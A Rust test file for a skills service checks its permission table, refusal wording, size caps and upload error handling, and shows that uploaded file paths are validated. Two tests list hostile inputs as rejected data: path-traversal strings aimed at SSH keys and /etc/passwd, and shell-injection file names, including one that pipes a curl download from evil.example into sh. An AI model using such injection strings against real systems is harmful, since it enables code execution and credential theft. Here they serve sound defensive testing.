use super::*;

/// The table, stated once here so a change to `may` has to be a deliberate edit of both.
#[test]
fn only_the_owner_writes_and_only_the_org_reads() {
    assert!(may(Relation::Owner, Action::Delete).is_ok());
    assert!(may(Relation::Owner, Action::AddVersion).is_ok());
    assert!(may(Relation::Owner, Action::Invoke).is_ok());
    assert!(may(Relation::OrgMember, Action::Read).is_ok());
    // The deliberate one: a colleague's skill may run inside this coworker's system message.
    // If this ever tightens, it tightens here and every caller inherits it.
    assert!(may(Relation::OrgMember, Action::Invoke).is_ok());
    assert!(may(Relation::OrgMember, Action::Edit).is_err());
    assert!(may(Relation::OrgMember, Action::Delete).is_err());
    assert!(may(Relation::None, Action::Read).is_err());
    assert!(may(Relation::None, Action::Invoke).is_err());
    assert_eq!(may(Relation::None, Action::Read), Err("no such skill"));
}

/// The sentence a refusal reaches the model with. A draft is the caller's own skill, so it is
/// named; nothing else is, because an enumeration is a claim and it is false for at least two
/// of these — a database blip is not "no such skill".
#[test]
fn a_refusal_names_a_cause_only_where_naming_one_leaks_nothing() {
    assert_eq!(
        NotForThisTurn::Draft.line(),
        crate::persona::SKILL_DRAFT_LINE
    );
    for refused in [
        NotForThisTurn::NoSuchSkill,
        NotForThisTurn::NotAnId,
        NotForThisTurn::Deleted,
        NotForThisTurn::Disabled,
        NotForThisTurn::NotTheirs,
        NotForThisTurn::Unquotable,
        NotForThisTurn::TooLong {
            length: 200_000,
            cap: MAX_SKILL_BODY_CHARS,
        },
        NotForThisTurn::Unreadable("the pool is closed".to_string()),
    ] {
        assert_eq!(
            refused.line(),
            crate::persona::SKILL_UNAVAILABLE_LINE,
            "{refused:?} must not describe a cause to the person"
        );
    }
    for word in ["deleted", "switched off", "no such skill"] {
        assert!(
            !crate::persona::SKILL_UNAVAILABLE_LINE.contains(word),
            "the shared sentence must stay true of a database blip too: {word}"
        );
    }
    // The store error is the operator's, and it must not travel to the model.
    assert!(
        !NotForThisTurn::Unreadable("connection refused".to_string())
            .line()
            .contains("connection refused")
    );
}

/// A path is refused rather than sanitised: these files are written onto a computer, and
/// every one of these got through at some point before somebody read the list again.
#[test]
fn a_bundled_path_cannot_climb_out_or_become_a_flag() {
    assert!(check_path("reference/cheatsheet.md").is_ok());
    assert!(check_path("a-b/c.d_e.md").is_ok());

    for refused in [
        "../../.ssh/authorized_keys",
        "/etc/passwd",
        "~/.ssh/authorized_keys", // a leading ~ is a home directory to every shell
        "windows\\path",
        "with\nnewline",
        "bell\u{7}",
        "wide\u{ff0f}slash", // not a separator here, and one the moment anything normalises
        "SKILL.md",
        "skill.md",
        "SKILL.md/", // the trailing slash used to walk straight past the check above
        "a//b",      // two rows, one file
        "./here",
        "-rf",
        "dir/-P/x",
        "",
    ] {
        assert!(
            check_path(&normalise_path(refused)).is_err(),
            "{refused:?} should be refused"
        );
    }
}

/// The copy onto a computer goes through a shell, and a bundle is often a colleague's: a path
/// that can close a quote or open a substitution is a command on the box of whoever invoked it.
/// These were all accepted while nothing copied the files (#192).
#[test]
fn a_bundled_path_carries_no_shell_syntax() {
    assert!(check_path("scripts/check.sh").is_ok());
    assert!(check_path("Reference_2/v1.0-notes.md").is_ok());
    for refused in [
        "a';curl evil.example | sh;'",
        "$(id).md",
        "notes `whoami`.md",
        "with space.md",
        "semi;colon",
        "pipe|d",
        "star*.md",
        "quote\"d",
        "caf\u{e9}.md",
    ] {
        assert!(
            check_path(refused).is_err(),
            "{refused:?} should be refused"
        );
    }
}

/// Every refusal from a bundle carries the status it deserves: a traversal is not a request
/// to send less data.
#[test]
fn a_bad_path_is_a_bad_request_and_a_big_bundle_is_too_large() {
    let file = |path: &str, bytes: &str| FileIn {
        path: path.to_string(),
        bytes: bytes.to_string(),
    };
    let encoded = base64::engine::general_purpose::STANDARD.encode(b"hello");

    let (status, why) = decode_files(&[file("../escape", &encoded)]).expect_err("refused");
    assert_eq!(status, StatusCode::BAD_REQUEST, "{why}");

    let (status, why) = decode_files(&[file("a.md", "not base64 !!!")]).expect_err("refused");
    assert_eq!(status, StatusCode::BAD_REQUEST, "{why}");

    let twice = [file("Notes.md", &encoded), file("notes.md", &encoded)];
    let (status, why) = decode_files(&twice).expect_err("refused");
    assert_eq!(status, StatusCode::BAD_REQUEST, "{why}");
    assert!(why.contains("twice"), "a disk folds the case: {why}");

    let many: Vec<FileIn> = (0..=MAX_BUNDLE_FILES)
        .map(|n| file(&format!("f{n}.md"), &encoded))
        .collect();
    let (status, why) = decode_files(&many).expect_err("refused");
    assert_eq!(status, StatusCode::PAYLOAD_TOO_LARGE, "{why}");

    // The size is read off the ENCODED length, so this is refused without ever being decoded.
    let fat = "A".repeat(MAX_BUNDLE_BYTES / 3 * 4 + 8);
    let (status, why) = decode_files(&[file("big.bin", &fat)]).expect_err("refused");
    assert_eq!(status, StatusCode::PAYLOAD_TOO_LARGE, "{why}");
    assert!(why.contains(&MAX_BUNDLE_BYTES.to_string()), "{why}");
}

/// The refusal has to name the limit AND what arrived, or the person cannot tell how much
/// to cut.
#[test]
fn an_over_long_body_is_refused_with_both_numbers() {
    let body = "x".repeat(MAX_SKILL_BODY_CHARS + 7);
    let (status, why) = check_body(&body).expect_err("over the cap");
    assert_eq!(status, StatusCode::PAYLOAD_TOO_LARGE);
    assert!(why.contains("8000"), "{why}");
    assert!(
        why.contains(&(MAX_SKILL_BODY_CHARS + 7).to_string()),
        "{why}"
    );
    assert!(check_body(&"x".repeat(MAX_SKILL_BODY_CHARS)).is_ok());
}

/// Characters, not bytes: a body of 8000 emoji is 8000 characters the person counted.
#[test]
fn the_body_cap_counts_characters() {
    assert!(check_body(&"é".repeat(MAX_SKILL_BODY_CHARS)).is_ok());
}

/// The description was the way around the body cap: it reaches the same system message.
#[test]
fn a_description_is_a_line_not_a_second_body() {
    assert!(check_description(&"x".repeat(MAX_SKILL_DESCRIPTION_CHARS)).is_ok());
    let (_, why) =
        check_description(&"x".repeat(MAX_SKILL_DESCRIPTION_CHARS + 1)).expect_err("over the cap");
    assert!(why.contains("300") && why.contains("301"), "{why}");
}

#[test]
fn a_client_cannot_claim_a_body_was_taught() {
    assert_eq!(kind_or_refusal(None, false), Ok("authored"));
    assert_eq!(kind_or_refusal(None, true), Ok("uploaded"));
    assert_eq!(kind_or_refusal(Some("uploaded"), false), Ok("uploaded"));
    assert!(kind_or_refusal(Some("taught"), false).is_err());
    assert!(kind_or_refusal(Some("magic"), false).is_err());
}

#[tokio::test]
async fn committed_tape_failure_preserves_status_body_id_and_headers() {
    let id = "skl_committed";
    let mut response = committed_skill_unreadable(id, "taught-sample");
    response.headers_mut().insert(
        "x-request-id",
        axum::http::HeaderValue::from_static("trace-1"),
    );
    let expected_headers = response.headers().clone();
    let expected = axum::body::to_bytes(
        committed_skill_unreadable(id, "taught-sample").into_body(),
        MAX_REFUSAL_BYTES,
    )
    .await
    .unwrap();
    let response = say_the_tape_survived(response).await;
    assert_eq!(response.status(), StatusCode::SERVICE_UNAVAILABLE);
    assert_eq!(response.headers(), &expected_headers);
    let actual = axum::body::to_bytes(response.into_body(), MAX_REFUSAL_BYTES)
        .await
        .unwrap();
    assert_eq!(actual, expected);
    let text = std::str::from_utf8(&actual).unwrap();
    assert!(text.contains(id));
    assert!(!text.contains(TAPE_KEPT_LINE));
}

#[tokio::test]
async fn committed_tape_failure_crosses_the_route_layers_unchanged() {
    use tower::ServiceExt;
    let app = axum::Router::new()
        .route(
            "/skills/from-tape",
            axum::routing::post(|| async { committed_skill_unreadable("skl_layered", "taught") }),
        )
        .layer(axum::extract::DefaultBodyLimit::max(MAX_TAPE_UPLOAD_BYTES))
        .layer(axum::middleware::from_fn(
            |request: axum::extract::Request, next: axum::middleware::Next| async move {
                say_the_tape_survived(next.run(request).await).await
            },
        ));
    let response = app
        .oneshot(
            axum::http::Request::post("/skills/from-tape")
                .body(axum::body::Body::empty())
                .unwrap(),
        )
        .await
        .unwrap();
    assert_eq!(response.status(), StatusCode::SERVICE_UNAVAILABLE);
    assert_eq!(
        response.headers()[axum::http::header::CONTENT_TYPE],
        "text/plain; charset=utf-8"
    );
    let bytes = axum::body::to_bytes(response.into_body(), MAX_REFUSAL_BYTES)
        .await
        .unwrap();
    assert_eq!(
        std::str::from_utf8(&bytes).unwrap(),
        "the skill was written as skl_layered under the name \"taught\" but could not be read \
         back; it is in your list, switched off, and the recording is spent."
    );
}

#[tokio::test]
async fn uncommitted_tape_failures_get_exactly_one_promise() {
    for response in [
        (StatusCode::BAD_REQUEST, "invalid tape").into_response(),
        (
            StatusCode::SERVICE_UNAVAILABLE,
            "the skill was written as skl_unmarked",
        )
            .into_response(),
        not_from_this_tape(StatusCode::SERVICE_UNAVAILABLE, "model unavailable"),
    ] {
        let expected_status = response.status();
        let response = say_the_tape_survived(response).await;
        assert_eq!(response.status(), expected_status);
        let bytes = axum::body::to_bytes(response.into_body(), MAX_REFUSAL_BYTES)
            .await
            .unwrap();
        let text = std::str::from_utf8(&bytes).unwrap();
        assert_eq!(text.matches(TAPE_KEPT_LINE).count(), 1);
    }
}

#[tokio::test]
async fn successful_tape_response_passes_through_unchanged() {
    let response = Json(serde_json::json!({ "id": "skl_success" })).into_response();
    let expected_headers = response.headers().clone();
    let response = say_the_tape_survived(response).await;
    assert_eq!(response.status(), StatusCode::OK);
    assert_eq!(response.headers(), &expected_headers);
    let bytes = axum::body::to_bytes(response.into_body(), MAX_REFUSAL_BYTES)
        .await
        .unwrap();
    assert_eq!(bytes.as_ref(), br#"{"id":"skl_success"}"#);
}
